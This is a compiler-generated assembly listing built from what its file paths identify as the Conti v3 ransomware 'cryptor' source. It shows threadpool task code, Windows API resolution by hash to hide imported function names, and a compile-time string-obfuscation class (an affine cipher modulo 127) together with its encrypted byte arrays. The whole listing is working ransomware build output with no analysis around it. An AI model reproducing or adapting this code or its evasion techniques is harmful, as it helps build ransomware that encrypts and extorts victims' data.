; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  0008c	8d 55 0f	 lea	 edx, QWORD PTR [rbp+15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  0008f	4c 89 43 30	 mov	 QWORD PTR [rbx+48], r8
  00093	4c 8b 07	 mov	 r8, QWORD PTR [rdi]
  00096	49 89 18	 mov	 QWORD PTR [r8], rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00099	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  0009f	4c 89 0f	 mov	 QWORD PTR [rdi], r9
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  000a2	44 8d 4d 4a	 lea	 r9d, QWORD PTR [rbp+74]
  000a6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  000ab	48 8b ce	 mov	 rcx, rsi
  000ae	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 231  : 	return TRUE;

  000b0	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  000b5	8d 45 01	 lea	 eax, QWORD PTR [rbp+1]
  000b8	48 8b 6c 24 38	 mov	 rbp, QWORD PTR [rsp+56]

; 232  : }

  000bd	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]
  000c2	48 83 c4 20	 add	 rsp, 32			; 00000020H
  000c6	5f		 pop	 rdi
  000c7	c3		 ret	 0
$LN7@PutFinalTa:
  000c8	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]
  000cd	33 c0		 xor	 eax, eax
  000cf	48 83 c4 20	 add	 rsp, 32			; 00000020H
  000d3	5f		 pop	 rdi
  000d4	c3		 ret	 0
?PutFinalTask@threadpool@@YAHH@Z ENDP			; threadpool::PutFinalTask
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 42 00 00
	00		 mov	 r10d, 66		; 00000042H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 77 00 00 00	 mov	 eax, 119		; 00000077H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4d	 mov	 BYTE PTR [rcx+1], 77	; 0000004dH
  00007	c6 41 02 04	 mov	 BYTE PTR [rcx+2], 4
  0000b	c6 41 03 41	 mov	 BYTE PTR [rcx+3], 65	; 00000041H
  0000f	c6 41 04 67	 mov	 BYTE PTR [rcx+4], 103	; 00000067H
  00013	c6 41 05 46	 mov	 BYTE PTR [rcx+5], 70	; 00000046H
  00017	c6 41 06 72	 mov	 BYTE PTR [rcx+6], 114	; 00000072H
  0001b	c6 41 07 46	 mov	 BYTE PTR [rcx+7], 70	; 00000046H
  0001f	c6 41 08 62	 mov	 BYTE PTR [rcx+8], 98	; 00000062H
  00023	c6 41 09 7d	 mov	 BYTE PTR [rcx+9], 125	; 0000007dH
  00027	c6 41 0a 5a	 mov	 BYTE PTR [rcx+10], 90	; 0000005aH
  0002b	c6 41 0b 74	 mov	 BYTE PTR [rcx+11], 116	; 00000074H
  0002f	c6 41 0c 3b	 mov	 BYTE PTR [rcx+12], 59	; 0000003bH
  00033	c6 41 0d 78	 mov	 BYTE PTR [rcx+13], 120	; 00000078H
  00037	c6 41 0e 2b	 mov	 BYTE PTR [rcx+14], 43	; 0000002bH
  0003b	c6 41 0f 3b	 mov	 BYTE PTR [rcx+15], 59	; 0000003bH
  0003f	c6 41 10 41	 mov	 BYTE PTR [rcx+16], 65	; 00000041H
  00043	c6 41 11 57	 mov	 BYTE PTR [rcx+17], 87	; 00000057H
  00047	c6 41 12 4c	 mov	 BYTE PTR [rcx+18], 76	; 0000004cH
  0004b	c6 41 13 5a	 mov	 BYTE PTR [rcx+19], 90	; 0000005aH
  0004f	c6 41 14 05	 mov	 BYTE PTR [rcx+20], 5
  00053	c6 41 15 10	 mov	 BYTE PTR [rcx+21], 16
  00057	c6 41 16 48	 mov	 BYTE PTR [rcx+22], 72	; 00000048H
  0005b	c6 41 17 5a	 mov	 BYTE PTR [rcx+23], 90	; 0000005aH
  0005f	c6 41 18 2b	 mov	 BYTE PTR [rcx+24], 43	; 0000002bH
  00063	c6 41 19 3b	 mov	 BYTE PTR [rcx+25], 59	; 0000003bH
  00067	c6 41 1a 4c	 mov	 BYTE PTR [rcx+26], 76	; 0000004cH
  0006b	c6 41 1b 5a	 mov	 BYTE PTR [rcx+27], 90	; 0000005aH
  0006f	c6 41 1c 48	 mov	 BYTE PTR [rcx+28], 72	; 00000048H
  00073	c6 41 1d 74	 mov	 BYTE PTR [rcx+29], 116	; 00000074H
  00077	c6 41 1e 10	 mov	 BYTE PTR [rcx+30], 16
  0007b	c6 41 1f 5a	 mov	 BYTE PTR [rcx+31], 90	; 0000005aH
  0007f	c6 41 20 5e	 mov	 BYTE PTR [rcx+32], 94	; 0000005eH
  00083	c6 41 21 67	 mov	 BYTE PTR [rcx+33], 103	; 00000067H
  00087	c6 41 22 35	 mov	 BYTE PTR [rcx+34], 53	; 00000035H
  0008b	c6 41 23 51	 mov	 BYTE PTR [rcx+35], 81	; 00000051H
  0008f	c6 41 24 7d	 mov	 BYTE PTR [rcx+36], 125	; 0000007dH
  00093	c6 41 25 46	 mov	 BYTE PTR [rcx+37], 70	; 00000046H
  00097	c6 41 26 6d	 mov	 BYTE PTR [rcx+38], 109	; 0000006dH
  0009b	c6 41 27 67	 mov	 BYTE PTR [rcx+39], 103	; 00000067H
  0009f	c6 41 28 2b	 mov	 BYTE PTR [rcx+40], 43	; 0000002bH
  000a3	c6 41 29 51	 mov	 BYTE PTR [rcx+41], 81	; 00000051H
  000a7	c6 41 2a 78	 mov	 BYTE PTR [rcx+42], 120	; 00000078H
  000ab	c6 41 2b 04	 mov	 BYTE PTR [rcx+43], 4
  000af	c6 41 2c 41	 mov	 BYTE PTR [rcx+44], 65	; 00000041H
  000b3	c6 41 2d 5a	 mov	 BYTE PTR [rcx+45], 90	; 0000005aH
  000b7	c6 41 2e 6e	 mov	 BYTE PTR [rcx+46], 110	; 0000006eH
  000bb	c6 41 2f 67	 mov	 BYTE PTR [rcx+47], 103	; 00000067H
  000bf	c6 41 30 46	 mov	 BYTE PTR [rcx+48], 70	; 00000046H
  000c3	c6 41 31 14	 mov	 BYTE PTR [rcx+49], 20
  000c7	c6 41 32 04	 mov	 BYTE PTR [rcx+50], 4
  000cb	c6 41 33 4c	 mov	 BYTE PTR [rcx+51], 76	; 0000004cH
  000cf	c6 41 34 57	 mov	 BYTE PTR [rcx+52], 87	; 00000057H
  000d3	c6 41 35 67	 mov	 BYTE PTR [rcx+53], 103	; 00000067H
  000d7	c6 41 36 5a	 mov	 BYTE PTR [rcx+54], 90	; 0000005aH
  000db	c6 41 37 33	 mov	 BYTE PTR [rcx+55], 51	; 00000033H
  000df	c6 41 38 6e	 mov	 BYTE PTR [rcx+56], 110	; 0000006eH
  000e3	c6 41 39 67	 mov	 BYTE PTR [rcx+57], 103	; 00000067H
  000e7	c6 41 3a 46	 mov	 BYTE PTR [rcx+58], 70	; 00000046H
  000eb	c6 41 3b 7d	 mov	 BYTE PTR [rcx+59], 125	; 0000007dH
  000ef	c6 41 3c 46	 mov	 BYTE PTR [rcx+60], 70	; 00000046H
  000f3	c6 41 3d 7d	 mov	 BYTE PTR [rcx+61], 125	; 0000007dH
  000f7	c6 41 3e 35	 mov	 BYTE PTR [rcx+62], 53	; 00000035H
  000fb	c6 41 3f 51	 mov	 BYTE PTR [rcx+63], 81	; 00000051H
  000ff	c6 41 40 57	 mov	 BYTE PTR [rcx+64], 87	; 00000057H
  00103	c6 41 41 3e	 mov	 BYTE PTR [rcx+65], 62	; 0000003eH
  00107	c6 41 42 77	 mov	 BYTE PTR [rcx+66], 119	; 00000077H
  0010b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0010f	48 8b c1	 mov	 rax, rcx
  00112	c3		 ret	 0
??0?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 42 00 00
	00		 mov	 r11d, 66		; 00000042H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 52	 sub	 ecx, 82			; 00000052H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 50	 mov	 BYTE PTR [rcx+1], 80	; 00000050H
  00007	c6 41 02 0a	 mov	 BYTE PTR [rcx+2], 10
  0000b	c6 41 03 19	 mov	 BYTE PTR [rcx+3], 25
  0000f	c6 41 04 33	 mov	 BYTE PTR [rcx+4], 51	; 00000033H
  00013	c6 41 05 7a	 mov	 BYTE PTR [rcx+5], 122	; 0000007aH
  00017	c6 41 06 70	 mov	 BYTE PTR [rcx+6], 112	; 00000070H
  0001b	c6 41 07 7a	 mov	 BYTE PTR [rcx+7], 122	; 0000007aH
  0001f	c6 41 08 51	 mov	 BYTE PTR [rcx+8], 81	; 00000051H
  00023	c6 41 09 2e	 mov	 BYTE PTR [rcx+9], 46	; 0000002eH
  00027	c6 41 0a 02	 mov	 BYTE PTR [rcx+10], 2
  0002b	c6 41 0b 64	 mov	 BYTE PTR [rcx+11], 100	; 00000064H
  0002f	c6 41 0c 3d	 mov	 BYTE PTR [rcx+12], 61	; 0000003dH
  00033	c6 41 0d 4c	 mov	 BYTE PTR [rcx+13], 76	; 0000004cH
  00037	c6 41 0e 1e	 mov	 BYTE PTR [rcx+14], 30
  0003b	c6 41 0f 3d	 mov	 BYTE PTR [rcx+15], 61	; 0000003dH
  0003f	c6 41 10 19	 mov	 BYTE PTR [rcx+16], 25
  00043	c6 41 11 14	 mov	 BYTE PTR [rcx+17], 20
  00047	c6 41 12 56	 mov	 BYTE PTR [rcx+18], 86	; 00000056H
  0004b	c6 41 13 02	 mov	 BYTE PTR [rcx+19], 2
  0004f	c6 41 14 04	 mov	 BYTE PTR [rcx+20], 4
  00053	c6 41 15 41	 mov	 BYTE PTR [rcx+21], 65	; 00000041H
  00057	c6 41 16 6e	 mov	 BYTE PTR [rcx+22], 110	; 0000006eH
  0005b	c6 41 17 02	 mov	 BYTE PTR [rcx+23], 2
  0005f	c6 41 18 1e	 mov	 BYTE PTR [rcx+24], 30
  00063	c6 41 19 3d	 mov	 BYTE PTR [rcx+25], 61	; 0000003dH
  00067	c6 41 1a 56	 mov	 BYTE PTR [rcx+26], 86	; 00000056H
  0006b	c6 41 1b 02	 mov	 BYTE PTR [rcx+27], 2
  0006f	c6 41 1c 6e	 mov	 BYTE PTR [rcx+28], 110	; 0000006eH
